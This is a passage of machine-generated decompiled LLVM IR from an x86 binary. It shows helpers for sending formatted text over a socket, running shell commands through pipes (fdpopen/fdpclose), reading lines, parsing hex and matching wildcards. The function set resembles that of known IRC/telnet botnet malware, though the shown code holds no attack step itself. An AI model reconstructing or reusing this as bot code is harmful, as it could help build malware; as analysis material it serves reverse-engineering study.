  %stack_var_8.4 = inttoptr i32 %v5_80487c1 to i8*
  store i32 %v5_80487c1, i32* %eax.global-to-local, align 4
  %v2_80487c7 = load i8, i8* %stack_var_8.4, align 1
  %v3_80487c7 = zext i8 %v2_80487c7 to i32
  %v5_80487c7 = and i32 %v5_80487c1, -256
  %v6_80487c7 = or i32 %v3_80487c7, %v5_80487c7
  store i32 %v6_80487c7, i32* %eax.global-to-local, align 4
  %v4_80487c9 = icmp eq i8 %v2_80487c7, 0
  %v1_80487cb = icmp eq i1 %v4_80487c9, false
  br i1 %v1_80487cb, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80487d1:                             ; preds = %dec_label_pc_80487c1, %dec_label_pc_80485bb, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_80485bb ], [ %stack_var_-28.0, %dec_label_pc_80487c1 ]
  %v4_80487d1 = icmp eq i32* %arg1, null
  br i1 %v4_80487d1, label %dec_label_pc_80487df, label %dec_label_pc_80487d7

dec_label_pc_80487d7:                             ; preds = %dec_label_pc_80487d1
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_80487da = load i32, i32* %arg1, align 4
  store i32 %v2_80487da, i32* %eax.global-to-local, align 4
  %v1_80487dc = inttoptr i32 %v2_80487da to i8*
  store i8 0, i8* %v1_80487dc, align 1
  br label %dec_label_pc_80487df

dec_label_pc_80487df:                             ; preds = %dec_label_pc_80487d1, %dec_label_pc_80487d7
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80487e2, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_80487c7, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80487c1, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_8048656, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048633.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048630.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80485fa, { 1, 2, 3, 0 }
  uselistorder i8* %v22_80485bb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_80487af, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 3, 4, 53, 54, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 57, 58, 59, 60, 61, 62, 63, 64, 65, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 38, 2, 0, 43, 44, 56, 55, 45, 46, 47, 48, 49, 50, 51, 52, 8, 5 }
  uselistorder i32 (i32)* @printi, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80487df, { 1, 0 }
  uselistorder label %dec_label_pc_80487c1, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_8048670, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
  uselistorder label %dec_label_pc_80485fa, { 1, 0 }
  uselistorder label %dec_label_pc_80485ae, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_80487ed = ptrtoint i32* %stack_var_8 to i32
  %v4_80487fc = call i32 @print(i32* null, i32 %arg1, i32 %v4_80487ed)
  ret i32 %v4_80487fc
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804880f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048820 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804880f)
  ret i32 %v4_8048820
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_804882d = load i32, i32* @edi, align 4
  %v1_8048839 = call i32 @malloc(i32 2048)
  store i32 %v1_8048839, i32* %stack_var_-20, align 4
  %v3_8048855 = inttoptr i32 %v1_8048839 to i8*
  %v4_8048855 = call i32 @__GI_memset(i8* %v3_8048855, i32 0, i32 2048)
  %v4_8048866 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048878 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048866)
  %v3_8048891 = call i32 @_strlen(i8* %v3_8048855)
  %v6_8048898 = add i32 %v1_8048839, %v3_8048891
  %v1_804889b = inttoptr i32 %v6_8048898 to i8*
  store i8 10, i8* %v1_804889b, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048839, i32* @edi, align 4
  %v3_80488af = call i32 @_strlen(i8* %v3_8048855)
  %v4_80488c2 = call i32 @__libc_send(i32 %arg1, i32 %v1_8048839, i32 %v3_80488af, i32 16384)
  %v1_80488d3 = call i32 @free(i32 %v1_8048839)
  store i32 %v0_804882d, i32* @edi, align 4
  ret i32 %v4_80488c2

; uselistorder directives
  uselistorder i32 %v1_8048839, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e6 = load i32, i32* @edi, align 4
  store i32 %v0_80488e6, i32* %stack_var_-8, align 4
  %v4_80488ea = ptrtoint i8* %tmp24 to i32
  %v2_80488ed = load i8, i8* %tmp24, align 1
  %v10_80488ef = icmp eq i8 %v2_80488ed, 114
  br i1 %v10_80488ef, label %dec_label_pc_80488fc, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %entry
  %v2_80488f6 = load i8, i8* %tmp24, align 1
  %v10_80488f8 = icmp eq i8 %v2_80488f6, 119
  %v1_80488fa = icmp eq i1 %v10_80488f8, false
  br i1 %v1_80488fa, label %dec_label_pc_8048ad1, label %dec_label_pc_80488fc

dec_label_pc_80488fc:                             ; preds = %dec_label_pc_80488f3, %entry
  %v1_80488ff = add i32 %v4_80488ea, 1
  %v1_8048900 = inttoptr i32 %v1_80488ff to i8*
  %v2_8048900 = load i8, i8* %v1_8048900, align 1
  %v4_8048902 = icmp eq i8 %v2_8048900, 0
  br i1 %v4_8048902, label %dec_label_pc_8048912, label %dec_label_pc_8048ad1

dec_label_pc_8048912:                             ; preds = %dec_label_pc_80488fc
  %v2_8048915 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048919 = call i32 @__GI_pipe(i32 %v2_8048915)
  %v2_8048921 = icmp slt i32 %v1_8048919, 0
  %v1_8048923 = icmp eq i1 %v2_8048921, false
  br i1 %v1_8048923, label %dec_label_pc_8048931, label %dec_label_pc_8048ad1

dec_label_pc_8048931:                             ; preds = %dec_label_pc_8048912
  %v0_8048931 = load i8*, i8** @global_var_805f560.13, align 4
  %v2_8048936 = icmp eq i8* %v0_8048931, null
  %v1_8048938 = icmp eq i1 %v2_8048936, false
  br i1 %v1_8048938, label %bb, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_8048931
  %v0_804893a = call i32 @getdtablesize()
  %tmp37 = icmp slt i32 %v0_804893a, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048954, label %dec_label_pc_8048ad1

dec_label_pc_8048954:                             ; preds = %dec_label_pc_804893a
  %v2_8048957 = mul i32 %v0_804893a, 4
  %v1_804895e = call i32 @malloc(i32 %v2_8048957)
  %v1_8048966 = inttoptr i32 %v1_804895e to i8*
  store i8* %v1_8048966, i8** @global_var_805f560.13, align 32
  %v2_8048970 = icmp eq i32 %v1_804895e, 0
  %v1_8048972 = icmp eq i1 %v2_8048970, false
  br i1 %v1_8048972, label %dec_label_pc_8048980, label %dec_label_pc_8048ad1

dec_label_pc_8048980:                             ; preds = %dec_label_pc_8048954
  %v1_8048983 = mul i32 %v0_804893a, 4
  store i32 %v1_804895e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048994 = and i32 %v1_804895e, -256
  %v5_8048996 = call i8* @_memset(i8* %v1_8048966, i32 %v1_8048994, i32 %v1_8048983)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048931, %dec_label_pc_8048980
  %v1_8048998 = call i32 @__vfork(i32 %tmp23)
  %v13_80489a6 = icmp eq i32 %v1_8048998, -1
  br i1 %v13_80489a6, label %dec_label_pc_80489b7, label %dec_label_pc_80489ac

dec_label_pc_80489ac:                             ; preds = %bb
  %v4_80489ac = icmp eq i32 %v1_8048998, 0
  %v2_80489e4 = load i8, i8* %tmp24, align 1
  %v10_80489e6 = icmp eq i8 %v2_80489e4, 114
  %v1_80489e8 = icmp eq i1 %v10_80489e6, false
  br i1 %v4_80489ac, label %dec_label_pc_80489e1, label %dec_label_pc_8048a82

dec_label_pc_80489b7:                             ; preds = %bb
  %v3_80489b7 = load i32, i32* %stack_var_-24, align 4
  %v1_80489be = call i32 @__libc_close(i32 %v3_80489b7)
  %v1_80489cd = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ad1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048a23, label %dec_label_pc_80489ea

dec_label_pc_80489ea:                             ; preds = %dec_label_pc_80489e1
  %v9_80489ed = icmp eq i32 %tmp19, 1
  br i1 %v9_80489ed, label %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, label %dec_label_pc_80489f2

dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge: ; preds = %dec_label_pc_80489ea
  br label %dec_label_pc_8048a12

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_80489ea
  %v2_80489fb = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048a0a = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a12

dec_label_pc_8048a12:                             ; preds = %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, %dec_label_pc_80489f2
  %v3_8048a12 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a19 = call i32 @__libc_close(i32 %v3_8048a12)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a23:                             ; preds = %dec_label_pc_80489e1
  %v3_8048a23 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a26 = icmp eq i32 %v3_8048a23, 0
  br i1 %v1_8048a26, label %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, label %dec_label_pc_8048a2a

dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge: ; preds = %dec_label_pc_8048a23
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a2a:                             ; preds = %dec_label_pc_8048a23
  %v2_8048a33 = call i32 @dup2(i32 %v3_8048a23, i32 0)
  %v3_8048a3b = load i32, i32* %stack_var_-24, align 4
  %v1_8048a42 = call i32 @__libc_close(i32 %v3_8048a3b)
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, %dec_label_pc_8048a2a
  %v1_8048a51 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a59:                             ; preds = %dec_label_pc_8048a12, %dec_label_pc_8048a4a
  %v8_8048a70 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8057668.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_805731b.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8057665.14 to i32), i32 %tmp18, i32 0)
  %v1_8048a7d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048aa2, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v3_8048a8b = load i32, i32* %stack_var_-24, align 4
  %v2_8048a98 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048aa2:                             ; preds = %dec_label_pc_8048a82
  %v3_8048aa8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048aaf = call i32 @__libc_close(i32 %v3_8048aa8)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048aa2
  %stack_var_-28.0 = phi i32 [ %v3_8048a8b, %dec_label_pc_8048a8b ], [ %tmp19, %dec_label_pc_8048aa2 ]
  %v2_8048aba = mul i32 %stack_var_-28.0, 4
  %v0_8048abf = load i8*, i8** @global_var_805f560.13, align 4
  %v1_8048abf = ptrtoint i8* %v0_8048abf to i32
  %v2_8048ac4 = add i32 %v1_8048abf, %v2_8048aba
  %v2_8048ac9 = inttoptr i32 %v2_8048ac4 to i32*
  store i32 %v1_8048998, i32* %v2_8048ac9, align 4
  br label %dec_label_pc_8048ad1

dec_label_pc_8048ad1:                             ; preds = %dec_label_pc_8048954, %dec_label_pc_804893a, %dec_label_pc_8048912, %dec_label_pc_80488f3, %dec_label_pc_80488fc, %dec_label_pc_80489b7, %dec_label_pc_8048ab7
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_80489b7 ], [ %stack_var_-28.0, %dec_label_pc_8048ab7 ], [ -1, %dec_label_pc_80488fc ], [ -1, %dec_label_pc_80488f3 ], [ -1, %dec_label_pc_8048912 ], [ -1, %dec_label_pc_804893a ], [ -1, %dec_label_pc_8048954 ]
  %v3_8048ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ad4, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048998, { 1, 2, 0 }
  uselistorder i32 %v1_804895e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804893a, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048ad1, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8048a59, { 1, 0 }
  uselistorder label %dec_label_pc_8048a4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048a12, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ad9 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ad9, i32* %stack_var_-4, align 4
  %v0_8048ae2 = load i8*, i8** @global_var_805f560.13, align 4
  %v2_8048ae7 = icmp eq i8* %v0_8048ae2, null
  br i1 %v2_8048ae7, label %dec_label_pc_8048c35, label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %entry
  %v1_8048ae2 = ptrtoint i8* %v0_8048ae2 to i32
  %v2_8048aee = mul i32 %tmp11, 4
  %v2_8048af8 = add i32 %v1_8048ae2, %v2_8048aee
  %v1_8048afb = inttoptr i32 %v2_8048af8 to i32*
  %v2_8048afb = load i32, i32* %v1_8048afb, align 4
  %v1_8048afd = icmp eq i32 %v2_8048afb, 0
  %v1_8048aff = icmp eq i1 %v1_8048afd, false
  br i1 %v1_8048aff, label %dec_label_pc_8048b10, label %dec_label_pc_8048c35

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048aeb
  %v1_8048b16 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048b21 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048b28 = call i32 @sigemptyset(i32 %v2_8048b21)
  %v2_8048b3c = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 2)
  %v2_8048b50 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 3)
  %v2_8048b64 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 1)
  %v2_8048b6f = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048b7f = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048b7f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048b7f, i32 %v2_8048b6f)
  %v2_8048b9e = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048b87

dec_label_pc_8048b87:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b10
  %v0_8048b8f = load i8*, i8** @global_var_805f560.13, align 4
  %v1_8048b8f = ptrtoint i8* %v0_8048b8f to i32
  %v2_8048b94 = add i32 %v1_8048b8f, %v2_8048aee
  %v1_8048b97 = inttoptr i32 %v2_8048b94 to i32*
  %v2_8048b97 = load i32, i32* %v1_8048b97, align 4
  %v3_8048ba6 = call i32 @__libc_waitpid(i32 %v2_8048b97, i32 %v2_8048b9e, i32 0)
  %v13_8048bb4 = icmp eq i32 %v3_8048ba6, -1
  %v1_8048bbb = icmp eq i1 %v13_8048bb4, false
  br i1 %v1_8048bbb, label %dec_label_pc_8048bc9, label %dec_label_pc_8048bbd

dec_label_pc_8048bbd:                             ; preds = %dec_label_pc_8048b87
  %v1_8048bbd = call i32 @__errno_location(i32 %v3_8048ba6)
  %v1_8048bc2 = inttoptr i32 %v1_8048bbd to i32*
  %v2_8048bc2 = load i32, i32* %v1_8048bc2, align 4
  %v9_8048bc4 = icmp eq i32 %v2_8048bc2, 4
  br i1 %v9_8048bc4, label %dec_label_pc_8048b87, label %dec_label_pc_8048bc9

dec_label_pc_8048bc9:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b87
  %v13_8048bb4.lcssa = phi i1 [ true, %dec_label_pc_8048bbd ], [ false, %dec_label_pc_8048b87 ]
  %v3_8048bd7 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048bd7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048bd7, i32 0)
  %v2_8048be5 = mul i32 %tmp8, 4
  %v0_8048bea = load i8*, i8** @global_var_805f560.13, align 4
  %v1_8048bea = ptrtoint i8* %v0_8048bea to i32
  %v2_8048bef = add i32 %v1_8048bea, %v2_8048be5
  %v1_8048bf2 = inttoptr i32 %v2_8048bef to i32*
  store i32 0, i32* %v1_8048bf2, align 4
  br i1 %v13_8048bb4.lcssa, label %dec_label_pc_8048c29, label %dec_label_pc_8048c01

dec_label_pc_8048c01:                             ; preds = %dec_label_pc_8048bc9
  %v3_8048c01 = load i32, i32* %stack_var_-268, align 4
  %v1_8048c0d = and i32 %v3_8048c01, 65280
  %v2_8048c141 = udiv i32 %v1_8048c0d, 256
  br label %dec_label_pc_8048c29

dec_label_pc_8048c29:                             ; preds = %dec_label_pc_8048bc9, %dec_label_pc_8048c01
  %storemerge2 = phi i32 [ %v2_8048c141, %dec_label_pc_8048c01 ], [ -1, %dec_label_pc_8048bc9 ]
  %v2_8048c3b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048c35

dec_label_pc_8048c35:                             ; preds = %entry, %dec_label_pc_8048aeb, %dec_label_pc_8048c29
  %v2_8048c3b = phi i32 [ %v2_8048c3b.pre, %dec_label_pc_8048c29 ], [ %v0_8048ad9, %dec_label_pc_8048aeb ], [ %v0_8048ad9, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048c29 ], [ -1, %dec_label_pc_8048aeb ], [ -1, %entry ]
  store i32 %v2_8048c3b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048ba6, { 1, 0 }
  uselistorder i32 %v2_8048aee, { 1, 0 }
  uselistorder i8* %v0_8048ae2, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805f560.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c29, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048c76

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c7e
  %v3_8048c62 = inttoptr i32 %v5_8048c81 to i32*
  %v4_8048c62 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048c62, i32 1)
  %v4_8048c6d = add nuw i32 %storemerge115, 1
  %v8_8048c70 = icmp eq i32 %v4_8048c62, 0
  %v12_8048c70 = icmp eq i32 %v4_8048c62, 1
  %v1_8048c74 = icmp eq i1 %v12_8048c70, false
  br i1 %v1_8048c74, label %dec_label_pc_8048c8b, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %entry, %dec_label_pc_8048c53
  %v8_8048c7016 = phi i1 [ false, %entry ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048c6d, %dec_label_pc_8048c53 ]
  %v5_8048c7c = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048c7c, label %dec_label_pc_8048c7e, label %dec_label_pc_8048c8b

dec_label_pc_8048c7e:                             ; preds = %dec_label_pc_8048c76
  %v5_8048c81 = add i32 %storemerge115, %arg1
  %v1_8048c84 = add i32 %v5_8048c81, -1
  %v1_8048c85 = inttoptr i32 %v1_8048c84 to i8*
  %v2_8048c85 = load i8, i8* %v1_8048c85, align 1
  %v10_8048c87 = icmp eq i8 %v2_8048c85, 10
  %v1_8048c89 = icmp eq i1 %v10_8048c87, false
  br i1 %v1_8048c89, label %dec_label_pc_8048c53, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c76, %dec_label_pc_8048c7e, %dec_label_pc_8048c53
  %v8_8048c70.lcssa = phi i1 [ %v8_8048c7016, %dec_label_pc_8048c76 ], [ %v8_8048c7016, %dec_label_pc_8048c7e ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  br i1 %v8_8048c70.lcssa, label %dec_label_pc_8048ca0, label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c8b
  br label %dec_label_pc_8048ca0

dec_label_pc_8048ca0:                             ; preds = %dec_label_pc_8048c8b, %dec_label_pc_8048c91
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048c91 ], [ 0, %dec_label_pc_8048c8b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048c81, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048c7016, { 1, 0 }
  uselistorder i1 %v8_8048c70, { 1, 0 }
  uselistorder i32 %v4_8048c62, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8048c8b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048c76, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048cd55 = ptrtoint i8* %arg1 to i32
  %v2_8048cd86 = load i8, i8* %arg1, align 1
  %v4_8048cda10 = icmp eq i8 %v2_8048cd86, 0
  br i1 %v4_8048cda10, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048cde
  %v2_8048cb9 = mul i32 %stack_var_-8.011, 16
  %v2_8048cbf = load i8, i8* %stack_var_4.012, align 1
  %v3_8048cbf = zext i8 %v2_8048cbf to i32
  %v1_8048cc6 = mul nuw nsw i32 %v3_8048cbf, 4
  %v2_8048cc6 = add i32 %v1_8048cc6, ptrtoint (i32* @global_var_8057680.17 to i32)
  %v3_8048cc6 = inttoptr i32 %v2_8048cc6 to i32*
  %v4_8048cc6 = load i32, i32* %v3_8048cc6, align 4
  %v2_8048ccd = or i32 %v4_8048cc6, %v2_8048cb9
  %v5_8048cd2 = add i32 %v4_8048cd513, 1
  %v22_8048cd2 = inttoptr i32 %v5_8048cd2 to i8*
  %v2_8048cd8 = load i8, i8* %v22_8048cd2, align 1
  %v4_8048cda = icmp eq i8 %v2_8048cd8, 0
  br i1 %v4_8048cda, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %entry, %dec_label_pc_8048cb4
  %v4_8048cd513 = phi i32 [ %v5_8048cd2, %dec_label_pc_8048cb4 ], [ %v4_8048cd55, %entry ]
  %stack_var_4.012 = phi i8* [ %v22_8048cd2, %dec_label_pc_8048cb4 ], [ %arg1, %entry ]
  %stack_var_-8.011 = phi i32 [ %v2_8048ccd, %dec_label_pc_8048cb4 ], [ 0, %entry ]
  %v5_8048cde = icmp slt i32 %stack_var_-8.011, 0
  %v1_8048ce2 = icmp eq i1 %v5_8048cde, false
  br i1 %v1_8048ce2, label %dec_label_pc_8048cb4, label %dec_label_pc_8048ce4

dec_label_pc_8048ce4:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cde, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.011, %dec_label_pc_8048cde ], [ %v2_8048ccd, %dec_label_pc_8048cb4 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048cde, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cec = load i32, i32* @ebx, align 4
  store i32 %v0_8048cec, i32* %stack_var_-8, align 4
  %v4_8048cf0 = ptrtoint i8* %arg1 to i32
  %v2_8048cf3 = load i8, i8* %arg1, align 1
  %v12_8048cff = icmp eq i8 %v2_8048cf3, 42
  br i1 %v12_8048cff, label %dec_label_pc_8048d2a, label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %entry
  %v12_8048d05 = icmp eq i8 %v2_8048cf3, 63
  br i1 %v12_8048d05, label %dec_label_pc_8048d7c, label %dec_label_pc_8048d0b

dec_label_pc_8048d0b:                             ; preds = %dec_label_pc_8048d05
  %v4_8048d0b = icmp eq i8 %v2_8048cf3, 0
  br i1 %v4_8048d0b, label %dec_label_pc_8048d16, label %dec_label_pc_8048db6

dec_label_pc_8048d16:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048d19 = load i8, i8* %tmp13, align 1
  %v3_8048d19 = zext i8 %v2_8048d19 to i32
  br label %dec_label_pc_8048e17

dec_label_pc_8048d2a:                             ; preds = %entry
  %v1_8048d2d = add i32 %v4_8048cf0, 1
  %v5_8048d34 = inttoptr i32 %v1_8048d2d to i8*
  %v5_8048d35 = call i32 @wildString(i8* %v5_8048d34, i32 %arg2)
  %v1_8048d3d = icmp eq i32 %v5_8048d35, 0
  br i1 %v1_8048d3d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2a
  %v2_8048d44 = load i8, i8* %tmp13, align 1
  %v4_8048d46 = icmp eq i8 %v2_8048d44, 0
  br i1 %v4_8048d46, label %dec_label_pc_8048d71, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d41
  %v1_8048d4d = add i32 %arg2, 1
  %v5_8048d55 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048d4d)
  %v1_8048d5d = icmp eq i32 %v5_8048d55, 0
  br i1 %v1_8048d5d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d71

